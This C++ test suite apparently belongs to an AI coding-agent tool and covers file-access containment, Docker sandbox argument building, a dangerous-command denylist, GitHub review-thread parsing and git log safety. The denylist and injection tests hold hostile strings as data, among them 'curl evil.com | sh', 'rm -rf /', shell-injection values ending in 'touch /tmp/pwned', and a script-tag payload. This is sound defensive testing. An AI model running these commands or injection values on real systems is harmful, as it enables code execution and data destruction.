#include "context_service.h"
#include "file_service.h"
#include "git_service.h"
#include "github_service.h"
#include "sandbox_service.h"
#include "validation.h"
#include "version.h"
#include "memory_manager.h"
#include "search_service.h"
// NOTE: do not include agent.h here. It defines Agent with defaulted move
// operations over unique_ptr<Services::AIService>, which is only forward
// declared there; MSVC instantiates the deleter eagerly and fails, while
// GCC/Clang defer it. The tests below need only the two persistence helpers,
// so forward-declare exactly those. A signature mismatch fails loudly at
// link time.
namespace Core {
void record_interaction(Data::MemoryManager &memory, const std::string &tag,
                        const std::string &result);
void record_global_fact(Data::MemoryManager &memory, const std::string &fact);
} // namespace Core
#include <chrono>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <gtest/gtest.h>
#include <numeric>
#include <set>
#include <sstream>
#include <string>

// Subset forward declaration: including mcp_service.h here would pull
// nlohmann/json.hpp onto the test include path, where it shadows the
// FetchContent gtest headers with the Homebrew copy (ABI mismatch).
namespace Services {
class MCPService {
public:
  static std::string get_server_status(const std::string &server_name);
};
} // namespace Services

// Basic test to verify the testing framework works
TEST(BasicTest, SanityCheck) { EXPECT_EQ(1 + 1, 2); }

// Test for version functionality
TEST(VersionTest, VersionCommand) {
  const char *version = Version::get_version();
  EXPECT_STREQ(version, agentware_version_string);
}

// Strict integer parsing used by read:/replace: handlers (R-01, R-02)
TEST(TryParseIntTest, AcceptsPlainIntegers) {
  int out = 0;
  EXPECT_TRUE(Utils::Validator::try_parse_int("12", out));
  EXPECT_EQ(out, 12);
  EXPECT_TRUE(Utils::Validator::try_parse_int("-3", out));
  EXPECT_EQ(out, -3);
  EXPECT_TRUE(Utils::Validator::try_parse_int("0", out));
  EXPECT_EQ(out, 0);
}

TEST(TryParseIntTest, RejectsNonNumeric) {
  int out = 99;
  EXPECT_FALSE(Utils::Validator::try_parse_int("", out));
  EXPECT_FALSE(Utils::Validator::try_parse_int("abc", out));
  EXPECT_FALSE(Utils::Validator::try_parse_int("12abc", out));
  EXPECT_FALSE(Utils::Validator::try_parse_int("1.5", out));
  EXPECT_FALSE(Utils::Validator::try_parse_int(" 12", out));
  EXPECT_FALSE(Utils::Validator::try_parse_int("12 ", out));
  // Failed parses leave the output untouched.
  EXPECT_EQ(out, 99);
}

// Access policy: project-root containment with canonical paths (R-06).
// Each test builds an isolated root under the system temp directory.
namespace {
std::filesystem::path MakeAccessRoot() {
  auto root = std::filesystem::temp_directory_path() /
              "agentware_access_test";
  std::error_code ec;
  std::filesystem::remove_all(root, ec);
  std::filesystem::create_directories(root / "sub", ec);
  return root;
}
} // namespace

TEST(FileAccessTest, RelativeInsideRootAllowed) {
  auto root = MakeAccessRoot();
  EXPECT_TRUE(
      Utils::Validator::validate_file_access("sub", root.string()).is_valid);
  EXPECT_TRUE(Utils::Validator::validate_file_access(
                                                     "sub/../sub", root.string())
                  .is_valid);
}

TEST(FileAccessTest, TraversalEscapeRejected) {
  auto root = MakeAccessRoot();
  auto result =
      Utils::Validator::validate_file_access("../outside.txt", root.string());
  EXPECT_FALSE(result.is_valid);
  EXPECT_NE(result.error_message.find("permitted root"), std::string::npos);
}

TEST(FileAccessTest, AbsoluteInsideRootAllowed) {
  auto root = MakeAccessRoot();
  EXPECT_TRUE(Utils::Validator::validate_file_access(
                                                     (root / "sub").string(), root.string())
                  .is_valid);
}

TEST(FileAccessTest, AbsoluteOutsideNonSensitiveAllowed) {
  auto root = MakeAccessRoot();
  auto sibling = root.parent_path() / "agentware_access_sibling.txt";
  EXPECT_TRUE(
      Utils::Validator::validate_file_access(sibling.string(), root.string())
          .is_valid);
}

TEST(FileAccessTest, RestrictedAbsoluteRejected) {
  auto root = MakeAccessRoot();
#ifdef _WIN32
  const char *paths[] = {"C:/Windows/System32",
                         "C:/Windows/System32/drivers/etc/hosts"};
#else
  const char *paths[] = {"/proc/self/status", "/sys/kernel", "/dev/null"};
#endif
  for (const char *p : paths) {
    auto result = Utils::Validator::validate_file_access(p, root.string());
    EXPECT_FALSE(result.is_valid) << p;
  }
}

TEST(FileAccessTest, SymlinkEscapeRejected) {
  auto root = MakeAccessRoot();
  auto outside = root.parent_path() / "agentware_access_outside.txt";
  std::error_code ec;
  // The target must exist: only then does canonicalization resolve the
  // link to the outside location (matching what open() would follow).
  std::ofstream(outside.string()) << "outside";
  std::filesystem::create_symlink(outside, root / "link.txt", ec);
  if (ec) {
    GTEST_SKIP() << "symlinks unavailable: " << ec.message();
  }
  auto result = Utils::Validator::validate_file_access("link.txt",
                                                       root.string());
  EXPECT_FALSE(result.is_valid);
  std::filesystem::remove_all(root, ec);
  std::filesystem::remove(outside, ec);
}

TEST(FileAccessTest, EmptyPathRejected) {
  auto root = MakeAccessRoot();
  EXPECT_FALSE(
      Utils::Validator::validate_file_access("", root.string()).is_valid);
}

TEST(FileAccessTest, SymlinkedParentEscapeRejected) {
  auto root = MakeAccessRoot();
  std::error_code ec;
  auto outside = std::filesystem::temp_directory_path() /
                 "agentware_access_outside_dir";
  std::filesystem::remove_all(outside, ec);
  std::filesystem::create_directories(outside, ec);
  std::filesystem::create_symlink(outside, root / "linkdir", ec);
  if (ec) {
    GTEST_SKIP() << "symlinks unavailable: " << ec.message();
  }
  // The parent linkdir resolves outside root, so any path beneath it
  // escapes even though the destination file does not exist yet.
  EXPECT_FALSE(Utils::Validator::validate_file_access("linkdir/evil.txt",
                                                      root.string())
                   .is_valid);
  std::filesystem::remove_all(outside, ec);
}

TEST(FileAccessTest, NonexistentNestedInsideAllowed) {
  auto root = MakeAccessRoot();
  EXPECT_TRUE(Utils::Validator::validate_file_access("newdir/note.txt",
                                                     root.string())
                  .is_valid);
}

// find_project_root must terminate on marker-less directories (review
// gate: the loop never ended at the filesystem root, hanging every chat
// started outside a project).
TEST(FindProjectRootTest, TerminatesWithoutMarkers) {
  namespace fs = std::filesystem;
  std::error_code ec;
  auto dir = fs::temp_directory_path() / "agentware_noroot_test";
  fs::remove_all(dir, ec);
  fs::create_directories(dir / "sub", ec);
  // The parent chain is the shared temp area, so only assert termination
  // and a sane result rather than a specific value.
  std::string root =
      Services::ContextService::find_project_root((dir / "sub").string());
  EXPECT_TRUE(root.empty() || fs::exists(fs::path(root), ec));
  fs::remove_all(dir, ec);
}

// MCP status wording must never imply a live process (R-07). Only the
// states reachable through the public API without side effects are
// asserted here; the registered-server states are covered by CLI probes
// against the repo's data/mcp_servers.json fixture.
TEST(MCPStatusTest, UnknownServerStatusIsHonest) {
  std::string status =
      Services::MCPService::get_server_status("__no_such_server__");
  EXPECT_EQ(status, "Not registered");
  EXPECT_EQ(status.find("Running"), std::string::npos);
}

// GitHub availability must depend only on GITHUB_TOKEN, never on the
// unrelated search key (review gate item 2). setenv/unsetenv are POSIX;
// skip on Windows rather than breaking that build.
TEST(GitHubAvailabilityTest, DependsOnlyOnGithubToken) {
#ifdef _WIN32
  GTEST_SKIP() << "POSIX environment manipulation unavailable";
#else
  const char *old_gh = std::getenv("GITHUB_TOKEN");
  const char *old_serp = std::getenv("SERPAPI_KEY");
  const std::string saved_gh = old_gh != nullptr ? old_gh : "";
  const std::string saved_serp = old_serp != nullptr ? old_serp : "";
  const bool had_gh = old_gh != nullptr;
  const bool had_serp = old_serp != nullptr;

  unsetenv("GITHUB_TOKEN");
  unsetenv("SERPAPI_KEY");
  EXPECT_FALSE(Services::GitHubService::is_available());

  setenv("GITHUB_TOKEN", "test-token", 1);
  EXPECT_TRUE(Services::GitHubService::is_available());

  if (had_gh) {
    setenv("GITHUB_TOKEN", saved_gh.c_str(), 1);
  } else {
    unsetenv("GITHUB_TOKEN");
  }
  if (had_serp) {
    setenv("SERPAPI_KEY", saved_serp.c_str(), 1);
  } else {
    unsetenv("SERPAPI_KEY");
  }
#endif
}

// Inline review-thread parsing from canned API payloads: no credentials,
// no network. Anchors describe comment-time positions only.
namespace {
const char *kThreadPayload = R"([
  {"id": 101, "path": "src/search_service.cpp", "line": 84,
   "original_line": 84, "commit_id": "abc123", "original_commit_id": "abc123",
   "diff_hunk": "@@ -80,6 +80,6 @@ context",
   "body": "Does this fallback preserve behavior without rg?",
   "user": {"login": "reviewer"}, "html_url": "https://example.com/c/101"},
  {"id": 102, "path": "src/search_service.cpp", "line": 90,
   "original_line": 84, "commit_id": "def456", "original_commit_id": "abc123",
   "diff_hunk": "@@ -80,6 +80,6 @@ context",
   "body": "Outdated: file moved since.",
   "user": {"login": "reviewer"}, "html_url": "https://example.com/c/102"},
  {"id": 103, "path": "src/old_file.cpp", "line": null,
   "original_line": null, "commit_id": "abc123", "original_commit_id": "abc123",
   "diff_hunk": "", "body": "File-level note, no line anchor.",
   "user": {"login": "reviewer"}, "html_url": "https://example.com/c/103"},
  {"id": 104, "path": "src/x.cpp", "line": 10,
   "original_line": 10, "commit_id": "abc123", "original_commit_id": "abc123",
   "diff_hunk": "",
   "body": "<script>alert('x')</script> \"quoted\" & done",
   "user": null, "html_url": "https://example.com/c/104"}
])";
} // namespace

TEST(ReviewThreadsTest, ParsesAnchoredComment) {
  auto threads = Services::GitHubService::parse_review_threads(kThreadPayload);
  ASSERT_EQ(threads.size(), 4u);
  const auto &t = threads[0];
  EXPECT_EQ(t.id, 101);
  EXPECT_EQ(t.path, "src/search_service.cpp");
  EXPECT_EQ(t.line, 84);
  EXPECT_EQ(t.original_line, 84);
  EXPECT_EQ(t.commit_id, "abc123");
  EXPECT_EQ(t.diff_hunk, "@@ -80,6 +80,6 @@ context");
  EXPECT_EQ(t.body, "Does this fallback preserve behavior without rg?");
  EXPECT_EQ(t.author, "reviewer");
  EXPECT_EQ(t.url, "https://example.com/c/101");
  EXPECT_EQ(t.resolution, "anchored");
}

TEST(ReviewThreadsTest, PreservesOutdatedAnchor) {
  auto threads = Services::GitHubService::parse_review_threads(kThreadPayload);
  const auto &t = threads[1];
  EXPECT_EQ(t.line, 90);
  EXPECT_EQ(t.original_line, 84);
  EXPECT_EQ(t.original_commit_id, "abc123");
  EXPECT_EQ(t.resolution, "anchored");
}

TEST(ReviewThreadsTest, MissingLineIsUnresolved) {
  auto threads = Services::GitHubService::parse_review_threads(kThreadPayload);
  const auto &t = threads[2];
  EXPECT_EQ(t.line, -1);
  EXPECT_EQ(t.original_line, -1);
  // The path is preserved verbatim; resolution against the current
  // revision (e.g. deleted files) is out of scope for the parser.
  EXPECT_EQ(t.path, "src/old_file.cpp");
  EXPECT_EQ(t.resolution, "unresolved");
}

TEST(ReviewThreadsTest, HostileBodyPassesThroughVerbatim) {
  auto threads = Services::GitHubService::parse_review_threads(kThreadPayload);
  const auto &t = threads[3];
  EXPECT_EQ(t.body, "<script>alert('x')</script> \"quoted\" & done");
  EXPECT_EQ(t.author, "");
  EXPECT_EQ(t.resolution, "anchored");
}

TEST(ReviewThreadsTest, EmptyArrayMeansNoThreads) {
  auto threads = Services::GitHubService::parse_review_threads("[]");
  EXPECT_TRUE(threads.empty());
}

TEST(ReviewThreadsTest, MalformedPayloadThrows) {
  EXPECT_THROW(Services::GitHubService::parse_review_threads("not json"),
               std::runtime_error);
  EXPECT_THROW(Services::GitHubService::parse_review_threads("{\"a\":1}"),
               std::runtime_error);
}

TEST(ReviewThreadsTest, ParsesLinkNext) {  HeaderMap next_headers;
  next_headers["Link"] = "<https://api.github.com/p/2>; rel=\"next\", "
                         "<https://api.github.com/p/9>; rel=\"last\"";
  EXPECT_EQ(Services::GitHubService::parse_link_next(next_headers),
            "https://api.github.com/p/2");

  HeaderMap no_link;
  EXPECT_EQ(Services::GitHubService::parse_link_next(no_link), "");

  HeaderMap last_only;
  last_only["link"] = "<https://api.github.com/p/9>; rel=\"last\"";
  EXPECT_EQ(Services::GitHubService::parse_link_next(last_only), "");

  HeaderMap malformed;
  malformed["Link"] = "not-a-link-header";
  EXPECT_EQ(Services::GitHubService::parse_link_next(malformed), "");
}

TEST(ReviewThreadsTest, CollectsMultiplePages) {
  auto page = [](int id, const std::string &next) {
    Services::WebResponse response;
    response.success = true;
    response.status_code = 200;
    response.content =
        "[{\"id\":" + std::to_string(id) + ",\"path\":\"f.cpp\",\"line\":1,"
        "\"original_line\":1,\"commit_id\":\"c\",\"original_commit_id\":"
        "\"c\",\"diff_hunk\":\"\",\"body\":\"b\",\"user\":{\"login\":\"u\"},"
        "\"html_url\":\"https://example.com\"}]";
    if (!next.empty()) {
      response.headers["Link"] = "<" + next + ">; rel=\"next\"";
    }
    return response;
  };
  auto fetch = [&](const std::string &url) -> Services::WebResponse {
    if (url == "https://api.test/p1") {
      return page(1, "https://api.test/p2");
    }
    return page(2, "");
  };
  auto list = Services::GitHubService::collect_review_threads(
      fetch, "https://api.test/p1");
  ASSERT_EQ(list.threads.size(), 2u);
  EXPECT_EQ(list.threads[0].id, 1);
  EXPECT_EQ(list.threads[1].id, 2);
  EXPECT_FALSE(list.truncated);
}

TEST(ReviewThreadsTest, PageCapReportsTruncation) {
  auto fetch = [](const std::string &url) -> Services::WebResponse {
    Services::WebResponse response;
    response.success = true;
    response.status_code = 200;
    response.content = "[]";
    // Every page claims another follows: the cap must stop the walk and
    // say the list is partial.
    response.headers["Link"] = "<https://api.test/next>; rel=\"next\"";
    (void)url;
    return response;
  };
  auto list = Services::GitHubService::collect_review_threads(
      fetch, "https://api.test/p1");
  EXPECT_TRUE(list.truncated);
}

TEST(ReviewThreadsTest, MidSequenceFailureThrows) {
  auto fetch = [](const std::string &url) -> Services::WebResponse {
    Services::WebResponse response;
    if (url == "https://api.test/p1") {
      response.success = true;
      response.status_code = 200;
      response.content = "[]";
      response.headers["Link"] = "<https://api.test/p2>; rel=\"next\"";
      return response;
    }
    response.success = false;
    response.status_code = 500;
    response.error_message = "HTTP 500 | Error: boom";
    return response;
  };
  EXPECT_THROW(Services::GitHubService::collect_review_threads(
                   fetch, "https://api.test/p1"),
               std::runtime_error);
}

TEST(ReviewThreadsTest, MalformedPageThrows) {
  auto fetch = [](const std::string &) -> Services::WebResponse {
    Services::WebResponse response;
    response.success = true;
    response.status_code = 200;
    response.content = "not json";
    return response;
  };
  EXPECT_THROW(Services::GitHubService::collect_review_threads(
                   fetch, "https://api.test/p1"),
               std::runtime_error);
}

// Sandbox docker invocation: argv elements reach the child verbatim with
// no shell involved, so hostile values are single inert elements.
TEST(SandboxCommandTest, HostileValuesAreSingleElements) {
  Services::SandboxConfig config;
  config.name = "test";
  config.image = "ubuntu:22.04";
  config.working_directory = "/workspace'; touch /tmp/pwned; echo '";
  config.volumes = {"/host'; touch /tmp/pwned; echo ':/workspace:rw"};
  config.environment_vars = {{"EVIL& reboot", "x'; touch /tmp/pwned; echo '"},
                             {"BAD\nKEY", "v"}};
  std::vector<std::string> argv = Services::SandboxService::build_docker_argv(
      config, "echo hi'; touch /tmp/pwned; echo '", "weird name; reboot");
  auto has_element = [&](const std::string &want) {
    return std::find(argv.begin(), argv.end(), want) != argv.end();
  };
  // Isolation flags present as exact elements.
  EXPECT_TRUE(has_element("--cap-drop"));
  EXPECT_TRUE(has_element("ALL"));
  EXPECT_TRUE(has_element("--security-opt"));
  EXPECT_TRUE(has_element("no-new-privileges"));
  EXPECT_TRUE(has_element("--pids-limit"));
  EXPECT_TRUE(has_element("256"));
  EXPECT_TRUE(has_element("--network=none"));
  // Hostile values survive only as single verbatim elements: nothing to
  // split, quote, or interpret downstream.
  EXPECT_TRUE(has_element("--workdir=/workspace'; touch /tmp/pwned; echo '"));
  EXPECT_TRUE(has_element("/host'; touch /tmp/pwned; echo ':/workspace:rw"));
  EXPECT_TRUE(has_element("EVIL& reboot=x'; touch /tmp/pwned; echo '"));
  EXPECT_TRUE(has_element("weird name; reboot"));
  EXPECT_TRUE(has_element("echo hi'; touch /tmp/pwned; echo '"));
  // Fixed structure around them.
  EXPECT_EQ(argv[0], "docker");
  EXPECT_EQ(argv[1], "run");
  EXPECT_EQ(argv.back(), "echo hi'; touch /tmp/pwned; echo '");
}

TEST(SandboxSpawnTest, EchoRoundTrip) {
#ifdef _WIN32
  auto out = Services::SandboxService::spawn_capture(
      {"cmd", "/c", "echo", "hello"});
#else
  auto out = Services::SandboxService::spawn_capture({"echo", "hello"});
#endif
  EXPECT_EQ(out.exit_code, 0);
  EXPECT_NE(out.output.find("hello"), std::string::npos);
}

TEST(SandboxSpawnTest, FailureCodePreserved) {
#ifdef _WIN32
  auto out =
      Services::SandboxService::spawn_capture({"cmd", "/c", "exit", "1"});
#else
  auto out = Services::SandboxService::spawn_capture({"false"});
#endif
  EXPECT_EQ(out.exit_code, 1);
}

TEST(SandboxSpawnTest, MissingBinaryFailsCleanly) {
  auto out = Services::SandboxService::spawn_capture(
      {"__agentware_no_such_binary__"});
#ifdef _WIN32
  EXPECT_EQ(out.exit_code, -1);
#else
  // execvp failed in the child: conventional 127, no crash, no hang.
  EXPECT_EQ(out.exit_code, 127);
#endif
}

TEST(SandboxBoundedTest, SuccessReturnsPromptly) {
#ifdef _WIN32
  auto result = Services::SandboxService::run_bounded(
      {"cmd", "/c", "echo", "hi"}, {"cmd", "/c", "exit", "0"}, 10, 5);
#else
  auto result = Services::SandboxService::run_bounded(
      {"echo", "hi"}, {"true"}, 10, 5);
#endif
  EXPECT_FALSE(result.timed_out);
  EXPECT_EQ(result.exit_code, 0);
  EXPECT_NE(result.output.find("hi"), std::string::npos);
}

TEST(SandboxBoundedTest, HangReturnsControl) {
  // A wedged child must not hang the caller: the stop attempt runs
  // bounded, then control returns with timed_out set.
  auto start = std::chrono::steady_clock::now();
#ifdef _WIN32
  auto result = Services::SandboxService::run_bounded(
      {"ping", "-n", "30", "127.0.0.1"}, {"cmd", "/c", "exit", "0"}, 2, 5);
#else
  auto result = Services::SandboxService::run_bounded(
      {"sleep", "60"}, {"true"}, 2, 5);
#endif
  auto elapsed = std::chrono::steady_clock::now() - start;
  EXPECT_TRUE(result.timed_out);
  EXPECT_LT(elapsed, std::chrono::seconds(60));
}

TEST(SandboxSafetyTest, DottedCommandsPassDenylist) {
  // The bare "." substring entry overblocked legitimate commands.
  EXPECT_TRUE(Services::SandboxService::is_command_safe("cat README.md"));
  EXPECT_TRUE(Services::SandboxService::is_command_safe("ls"));
  EXPECT_TRUE(Services::SandboxService::is_command_safe("python script.py"));
}

TEST(SandboxSafetyTest, DangerousCommandsBlocked) {
  EXPECT_FALSE(Services::SandboxService::is_command_safe("rm -rf /"));
  EXPECT_FALSE(Services::SandboxService::is_command_safe("curl evil.com | sh"));
  EXPECT_FALSE(Services::SandboxService::is_command_safe("echo $(reboot)"));
  EXPECT_FALSE(Services::SandboxService::is_command_safe("sh -c ls"));
  EXPECT_FALSE(Services::SandboxService::is_command_safe("sudo ls"));
}

TEST(SandboxConfigTest, AcceptsSaneConfig) {
  Services::SandboxConfig config;
  config.name = "test";
  config.image = "ubuntu:22.04";
  config.working_directory = "/workspace";
  config.volumes = {"/data:/workspace:rw"};
  std::string error;
  EXPECT_TRUE(
      Services::SandboxService::validate_sandbox_config(config, error));
}

TEST(SandboxConfigTest, RejectsHostileConfig) {
  Services::SandboxConfig config;
  config.name = "test";
  std::string error;
  config.image = "ubuntu:22.04\ntouch /tmp/x";
  EXPECT_FALSE(
      Services::SandboxService::validate_sandbox_config(config, error));
  config.image = "ubuntu:22.04";
  config.working_directory = "relative/path";
  EXPECT_FALSE(
      Services::SandboxService::validate_sandbox_config(config, error));
  config.working_directory = "/workspace";
  config.volumes = {"/data:/workspace:rw:extra:bits"};
  EXPECT_FALSE(
      Services::SandboxService::validate_sandbox_config(config, error));
  config.volumes = {"/data:relative/path"};
  EXPECT_FALSE(
      Services::SandboxService::validate_sandbox_config(config, error));
  config.volumes = {":/workspace"};
  EXPECT_FALSE(
      Services::SandboxService::validate_sandbox_config(config, error));
}

TEST(SandboxResultTest, FormatsHonestly) {  Services::SandboxResult ok;
  ok.exit_code = 0;
  ok.stdout_output = "hi";
  EXPECT_EQ(Services::SandboxService::format_result(ok), "hi");

  Services::SandboxResult empty;
  empty.exit_code = 0;
  EXPECT_EQ(Services::SandboxService::format_result(empty),
            "Command completed");

  Services::SandboxResult failed;
  failed.exit_code = 1;
  failed.stdout_output = "out";
  failed.error_message = "boom";
  std::string text = Services::SandboxService::format_result(failed);
  EXPECT_NE(text.find("Exit code: 1"), std::string::npos);
  EXPECT_NE(text.find("Error: boom"), std::string::npos);

  Services::SandboxResult timed_out;
  timed_out.exit_code = -1;
  timed_out.timed_out = true;
  timed_out.error_message = "Command execution timed out after 2s";
  text = Services::SandboxService::format_result(timed_out);
  EXPECT_NE(text.find("[Command timed out]"), std::string::npos);
}

// End-to-end routing through a fake docker on PATH: no daemon required.
// POSIX-only (fake is a shell stub, PATH is manipulated); skipped on
// Windows rather than breaking that build.
TEST(SandboxDockerTest, ExecutesThroughFakeDocker) {
#ifdef _WIN32
  GTEST_SKIP() << "fake-docker stub needs a POSIX shell";
#else
  namespace fs = std::filesystem;
  std::error_code ec;
  auto dir = fs::temp_directory_path() / "agentware_fakedocker_test";
  fs::remove_all(dir, ec);
  fs::create_directories(dir / "bin", ec);
  {
    std::ofstream stub(dir / "bin" / "docker");
    stub << "#!/bin/sh\n"
            "if [ \"$1\" = \"--version\" ]; then\n"
            "  echo \"Docker version 99.0-fake\"; exit 0\n"
            "fi\n"
            "if [ \"$1\" = \"stop\" ]; then exit 0; fi\n"
            "echo \"fake-output\"\n"
            "exit 0\n";
  }
  fs::permissions(dir / "bin" / "docker",
                  fs::perms::owner_exec | fs::perms::owner_read, ec);
  auto old_cwd = fs::current_path(ec);
  fs::current_path(dir, ec);
  ASSERT_FALSE(ec);
  const char *old_path = std::getenv("PATH");
  const std::string saved_path = old_path != nullptr ? old_path : "";
  setenv("PATH", ((dir / "bin").string() + ":/usr/bin:/bin").c_str(), 1);

  EXPECT_TRUE(Services::SandboxService::is_docker_available());

  Services::SandboxConfig config;
  config.name = "test-fake";
  config.image = "ubuntu:22.04";
  config.timeout_seconds = 30;
  ASSERT_TRUE(Services::SandboxService::create_sandbox_config("test-fake", config));
  Services::SandboxResult result =
      Services::SandboxService::execute_command("echo hi", "test-fake");
  EXPECT_EQ(result.exit_code, 0);
  EXPECT_NE(result.stdout_output.find("fake-output"), std::string::npos);
  EXPECT_FALSE(result.timed_out);
  EXPECT_TRUE(Services::SandboxService::remove_sandbox_config("test-fake"));

  setenv("PATH", saved_path.c_str(), 1);
  fs::current_path(old_cwd, ec);
  fs::remove_all(dir, ec);
#endif
}

TEST(SandboxDockerTest, DaemonFailureReported) {
#ifdef _WIN32
  GTEST_SKIP() << "fake-docker stub needs a POSIX shell";
#else
  namespace fs = std::filesystem;
  std::error_code ec;
  auto dir = fs::temp_directory_path() / "agentware_fakedocker_fail";
  fs::remove_all(dir, ec);
  fs::create_directories(dir / "bin", ec);
  {
    std::ofstream stub(dir / "bin" / "docker");
    stub << "#!/bin/sh\n"
            "if [ \"$1\" = \"--version\" ]; then\n"
            "  echo \"Docker version 99.0-fake\"; exit 0\n"
            "fi\n"
            "echo \"fake: cannot connect\" >&2\n"
            "exit 1\n";
  }
  fs::permissions(dir / "bin" / "docker",
                  fs::perms::owner_exec | fs::perms::owner_read, ec);
  auto old_cwd = fs::current_path(ec);
  fs::current_path(dir, ec);
  ASSERT_FALSE(ec);
  const char *old_path = std::getenv("PATH");
  const std::string saved_path = old_path != nullptr ? old_path : "";
  setenv("PATH", ((dir / "bin").string() + ":/usr/bin:/bin").c_str(), 1);

  Services::SandboxConfig config;
  config.name = "test-fake-fail";
  config.image = "ubuntu:22.04";
  config.timeout_seconds = 30;
  ASSERT_TRUE(
      Services::SandboxService::create_sandbox_config("test-fake-fail", config));
  Services::SandboxResult result =
      Services::SandboxService::execute_command("echo hi", "test-fake-fail");
  EXPECT_EQ(result.exit_code, 1);
  EXPECT_FALSE(result.timed_out);
  EXPECT_TRUE(Services::SandboxService::remove_sandbox_config("test-fake-fail"));

  setenv("PATH", saved_path.c_str(), 1);
  fs::current_path(old_cwd, ec);
  fs::remove_all(dir, ec);
#endif
}

TEST(SandboxDockerTest, HangEnforcesTimeout) {
#ifdef _WIN32
  GTEST_SKIP() << "fake-docker stub needs a POSIX shell";
#else
  namespace fs = std::filesystem;
  std::error_code ec;
  auto dir = fs::temp_directory_path() / "agentware_fakedocker_hang";
  fs::remove_all(dir, ec);
  fs::create_directories(dir / "bin", ec);
  {
    std::ofstream stub(dir / "bin" / "docker");
    stub << "#!/bin/sh\n"
            "if [ \"$1\" = \"--version\" ]; then\n"
            "  echo \"Docker version 99.0-fake\"; exit 0\n"
            "fi\n"
            "if [ \"$1\" = \"stop\" ]; then exit 0; fi\n"
            "sleep 120\n";
  }
  fs::permissions(dir / "bin" / "docker",
                  fs::perms::owner_exec | fs::perms::owner_read, ec);
  auto old_cwd = fs::current_path(ec);
  fs::current_path(dir, ec);
  ASSERT_FALSE(ec);
  const char *old_path = std::getenv("PATH");
  const std::string saved_path = old_path != nullptr ? old_path : "";
  setenv("PATH", ((dir / "bin").string() + ":/usr/bin:/bin").c_str(), 1);

  Services::SandboxConfig config;
  config.name = "test-fake-hang";
  config.image = "ubuntu:22.04";
  config.timeout_seconds = 2;
  ASSERT_TRUE(
      Services::SandboxService::create_sandbox_config("test-fake-hang", config));
  auto start = std::chrono::steady_clock::now();
  Services::SandboxResult result =
      Services::SandboxService::execute_command("echo hi", "test-fake-hang");
  auto elapsed = std::chrono::steady_clock::now() - start;
  EXPECT_TRUE(result.timed_out);
  EXPECT_LT(elapsed, std::chrono::seconds(60));
  EXPECT_TRUE(Services::SandboxService::remove_sandbox_config("test-fake-hang"));

  setenv("PATH", saved_path.c_str(), 1);
  fs::current_path(old_cwd, ec);
  fs::remove_all(dir, ec);
#endif
}

// A1: empty replace patterns must error promptly, never hang, and leave
// file bytes untouched.
TEST(ReplaceEmptyPatternTest, ReturnsPromptlyWithError) {
  namespace fs = std::filesystem;
  std::error_code ec;
  auto dir = fs::temp_directory_path() / "agentware_replace_test";
  fs::remove_all(dir, ec);
  fs::create_directories(dir, ec);
  auto file = dir / "sample.txt";
  { std::ofstream out(file); out << "hello"; }
  auto start = std::chrono::steady_clock::now();
  Services::FileEditResult result =
      Services::FileService::replace_text_in_file(file.string(), "", "new",
                                                  1);
  auto elapsed = std::chrono::steady_clock::now() - start;
  EXPECT_FALSE(result.success);
  EXPECT_NE(result.message.find("Error:"), std::string::npos);
  EXPECT_LT(elapsed, std::chrono::seconds(10));
  std::ifstream check(file);
  std::string content((std::istreambuf_iterator<char>(check)),
                      std::istreambuf_iterator<char>());
  EXPECT_EQ(content, "hello");
  fs::remove_all(dir, ec);
}

// A3: nullable issue fields degrade to defaults instead of discarding a
// valid listing.
TEST(ParseIssuesTest, NullFieldsDegradeGracefully) {
  const char *payload = R"([
    {"number": 7, "title": null, "body": null, "state": "open",
     "labels": null, "assignee": null,
     "milestone": {"number": 3}},
    {"number": 8, "title": "T", "body": "B", "state": "closed",
     "labels": [{"name": "bug"}], "assignee": {"login": "u"}}
  ])";
  auto issues = Services::GitHubService::parse_issues(payload);
  ASSERT_EQ(issues.size(), 2u);
  EXPECT_EQ(issues[0].number, 7);
  EXPECT_EQ(issues[0].title, "");
  EXPECT_EQ(issues[0].body, "");
  EXPECT_EQ(issues[0].state, "open");
  EXPECT_TRUE(issues[0].labels.empty());
  EXPECT_TRUE(issues[0].assignees.empty());
  EXPECT_EQ(issues[0].milestone, 3);
  EXPECT_EQ(issues[1].title, "T");
  EXPECT_EQ(issues[1].labels.size(), 1u);
  EXPECT_EQ(issues[1].assignees.size(), 1u);
}

TEST(ParseIssuesTest, MalformedPayloadThrows) {
  EXPECT_THROW(Services::GitHubService::parse_issues("not json"),
               std::runtime_error);
  EXPECT_THROW(Services::GitHubService::parse_issues("{\"a\":1}"),
               std::runtime_error);
}

// B1: internally constructed git commands must run; hostile paths must
// be refused before any shell sees them. Needs a git binary; skip
// without one rather than failing the suite.
TEST(GitLogTest, WorksInRepoAndRefusesHostilePath) {
  if (std::system("git --version > /dev/null 2>&1") != 0) {
    GTEST_SKIP() << "git binary unavailable";
  }
  namespace fs = std::filesystem;
  std::error_code ec;
  auto dir = fs::temp_directory_path() / "agentware_git_test";
  fs::remove_all(dir, ec);
  fs::create_directories(dir, ec);
  auto run = [&](const std::string &cmd) {
    return std::system(cmd.c_str());
  };
  std::string d = dir.string();
  ASSERT_EQ(run("git -C \"" + d + "\" init -q"), 0);
  ASSERT_EQ(run("git -C \"" + d + "\" config user.email t@t"), 0);
  ASSERT_EQ(run("git -C \"" + d + "\" config user.name t"), 0);
  {
    std::ofstream f(d + "/note.txt");
    f << "hi";
  }
  ASSERT_EQ(run("git -C \"" + d + "\" add -A"), 0);
  ASSERT_EQ(run("git -C \"" + d + "\" commit -qm seed"), 0);

  std::string log = Services::GitService::get_git_log(d, 30);
  EXPECT_NE(log.find("seed"), std::string::npos);

  // Hostile paths never reach a shell: nonexistent ones fail at the
  // repository check, existing hostile-named ones at the path check.
  EXPECT_NE(Services::GitService::get_git_log(d + "\"; touch /tmp/pwned", 30).find("Error:"), std::string::npos);
  std::string hostile = d + "/a;b";
  fs::create_directories(hostile, ec);
  ASSERT_EQ(run("git -C \"" + hostile + "\" init -q"), 0);
  EXPECT_NE(Services::GitService::get_git_log(hostile, 30).find("Unsafe"), std::string::npos);
  EXPECT_FALSE(fs::exists("/tmp/pwned", ec));
  fs::remove_all(dir, ec);
}

int main(int argc, char **argv) {
  ::testing::InitGoogleTest(&argc, argv);
  return RUN_ALL_TESTS();
}

// ---------------------------------------------------------------------------
// Memory persistence boundary: a write failure must warn and continue,
// never terminate the session and never claim the write succeeded.
// ---------------------------------------------------------------------------

namespace {

std::filesystem::path fresh_temp_dir(const std::string &name) {
  auto dir = std::filesystem::temp_directory_path() /
             ("agentware_test_" + name);
  std::filesystem::remove_all(dir);
